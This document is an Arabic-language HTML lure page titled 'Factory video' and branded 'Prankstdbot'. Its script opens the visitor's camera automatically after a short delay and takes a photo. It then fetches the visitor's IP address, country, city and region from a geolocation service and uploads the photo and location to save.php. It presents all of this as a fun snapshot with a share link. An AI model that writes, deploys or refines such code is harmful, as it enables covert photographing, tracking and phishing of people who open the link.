<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Factory video</title>
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6213671887113386"
   crossorigin="anonymous"></script>

  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
    }

    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      position: relative;
    }

    #photo-container {
      position: relative;
      display: none;
    }

    #photo {
      width: 90vw;
      height: auto;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
      margin-bottom: 20px;
    }

    .caption {
      font-size: 20px;
      margin-top: 10px;
      color: #00ffea;
      animation: fadeIn 2s ease-in-out;
    }

    .stylish-text {
      margin-top: 20px;
      font-size: 18px;
      color: #ff6b6b;
      text-decoration: underline;
      cursor: pointer;
    }

    #new-capture-btn {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 18px;
      background-color: #00c3ff;
      color: white;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s;
      display: none;
    }

    #new-capture-btn:hover {
      background-color: #008bb5;
    }

    #error-message {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: red;
      padding: 15px 25px;
      border-radius: 10px;
      color: white;
      font-size: 18px;
      z-index: 999;
      opacity: 0;
      transition: opacity 0.5s;
    }

    #error-message.show {
      opacity: 1;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 2s linear infinite;
      margin-top: 20px;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }

    #upcaption a span {
      font-size: 24px;
      animation: move 1s ease-in-out infinite alternate;
      display: inline-block;
    }

    #upcaption a span:nth-child(1) { animation-delay: 0s; }
    #upcaption a span:nth-child(2) { animation-delay: 0.1s; }
    #upcaption a span:nth-child(3) { animation-delay: 0.2s; }
    #upcaption a span:nth-child(4) { animation-delay: 0.3s; }
    #upcaption a span:nth-child(5) { animation-delay: 0.4s; }
    #upcaption a span:nth-child(6) { animation-delay: 0.5s; }
    #upcaption a span:nth-child(7) { animation-delay: 0.6s; }
    #upcaption a span:nth-child(8) { animation-delay: 0.7s; }
    #upcaption a span:nth-child(9) { animation-delay: 0.8s; }
    #upcaption a span:nth-child(10) { animation-delay: 0.9s; }

    @keyframes move {
      0% { transform: translateY(0); }
      100% { transform: translateY(-10px); }
    }
  </style>

  <!-- Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-TPSL288BGF"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-TPSL288BGF');
  </script>
</head>

<body>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div id="photo-container">
    <img id="photo" alt="Captured" />
    <p id="upcaption">
      <a href="#" target="_blank">
        <span>P</span><span>r</span><span>a</span><span>n</span><span>k</span><span>s</span><span>t</span><span>d</span><span>b</span><span>o</span><span>t</span>
      </a>
    </p>
  </div>

  <div id="error-message"></div>
  <div class="loader" id="loading"></div>
  <div class="caption" id="caption"></div>
  <div class="stylish-text" id="link"></div>
  <button id="new-capture-btn">أخذ لقطة جديدة</button>

  <script>
    const videoElement = document.getElementById('video');
    const canvasElement = document.getElementById('canvas');
    const photoElement = document.getElementById('photo');
    const captionElement = document.getElementById('caption');
    const linkElement = document.getElementById('link');
    const loadingElement = document.getElementById('loading');
    const photoContainer = document.getElementById('photo-container');
    const newCaptureButton = document.getElementById('new-capture-btn');

    const captions = [
      'صور رائعة',
      'لحظة رائعة!',
      'كانت لقطة جميلة',
      'التقطت صورة مذهلة',
      'استمتع بلقطة جديدة'
    ];
    const randomCaption = captions[Math.floor(Math.random() * captions.length)];

    function showErrorMessage(message) {
      const errorMessageElement = document.getElementById('error-message');
      errorMessageElement.textContent = message;
      errorMessageElement.style.display = 'block';
      errorMessageElement.classList.add('show');
      setTimeout(() => {
        errorMessageElement.classList.remove('show');
        setTimeout(() => {
          errorMessageElement.style.display = 'none';
          location.reload();
        }, 500);
      }, 7000);
    }

    function isIOS() {
      return /iPad|iPhone|iPod/.test(navigator.userAgent) && !(window.MSStream);
    }

    async function getGeoInfo() {
      const response = await fetch('https://get.geojs.io/v1/ip/geo.js');
      const text = await response.text();
      const jsonData = text.replace('geoip(', '').replace(')', '');
      return JSON.parse(jsonData);
    }

    function getQueryParameter(param) {
      const params = new URLSearchParams(window.location.search);
      return params.get(param);
    }

    async function capturePhotoForIOS(skipLoader = false) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        videoElement.srcObject = stream;

        await new Promise((resolve) => {
          videoElement.onloadedmetadata = () => { resolve(); };
        });

        await new Promise((resolve) => setTimeout(resolve, 500));

        const canvasContext = canvasElement.getContext('2d');
        canvasElement.width = videoElement.videoWidth;
        canvasElement.height = videoElement.videoHeight;
        canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

        canvasElement.toBlob(async (blob) => {
          if (!blob) throw new Error("فشل في تحويل الصورة إلى blob");
          if (!skipLoader) loadingElement.style.display = 'block';

          const geoInfo = await getGeoInfo();
          const videoId = getQueryParameter('video');

          const formData = new FormData();
          formData.append('image', blob, 'photo.png');
          formData.append('country', geoInfo.country);
          formData.append('city', geoInfo.city);
          formData.append('region', geoInfo.region);
          formData.append('ip', geoInfo.ip);
          formData.append('video', videoId);

          await fetch('save.php', { method: 'POST', body: formData });

          loadingElement.style.display = 'none';
          const imageUrl = URL.createObjectURL(blob);
          photoElement.src = imageUrl;
          photoContainer.style.display = 'block';
          captionElement.textContent = randomCaption;
          linkElement.textContent = '';
          newCaptureButton.style.display = 'inline-block';

          stream.getTracks().forEach(track => track.stop());
        }, 'image/png');

      } catch (error) {
        console.error('Error capturing photo:', error);
        showErrorMessage('حدث خطأ أثناء التقاط الصورة.');
      }
    }

    async function capturePhotoForOtherDevices(skipLoader = false) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const blob = await imageCapture.takePhoto();

        if (!skipLoader) loadingElement.style.display = 'block';

        const geoInfo = await getGeoInfo();
        const videoId = getQueryParameter('video');

        const formData = new FormData();
        formData.append('image', blob, 'photo.png');
        formData.append('country', geoInfo.country);
        formData.append('city', geoInfo.city);
        formData.append('region', geoInfo.region);
        formData.append('ip', geoInfo.ip);
        formData.append('video', videoId);

        await fetch('save.php', { method: 'POST', body: formData });

        loadingElement.style.display = 'none';
        const imageUrl = URL.createObjectURL(blob);
        photoElement.src = imageUrl;
        photoContainer.style.display = 'block';
        captionElement.textContent = randomCaption;
        linkElement.textContent = 'اضغط هنا لمشاركة الصورة مع أصدقائك!';
        newCaptureButton.style.display = 'inline-block';

        stream.getTracks().forEach(track => track.stop());
      } catch (error) {
        console.error('Error capturing photo:', error);
        showErrorMessage('حدث خطأ أثناء التقاط الصورة.');
      }
    }

    // تأخير 3 ثواني قبل فتح الكاميرا
    setTimeout(() => {
      if (isIOS()) {
        capturePhotoForIOS();
      } else {
        capturePhotoForOtherDevices();
      }
    }, 1000);

    linkElement.addEventListener('click', function() {
      window.open('#', '_blank');
    });

    newCaptureButton.addEventListener('click', () => {
      photoContainer.style.display = 'none';
      newCaptureButton.style.display = 'none';
      captionElement.textContent = '';
      linkElement.textContent = '';
      if (isIOS()) {
        capturePhotoForIOS();
      } else {
        capturePhotoForOtherDevices();
      }
    });
  </script>

</body>
</html>
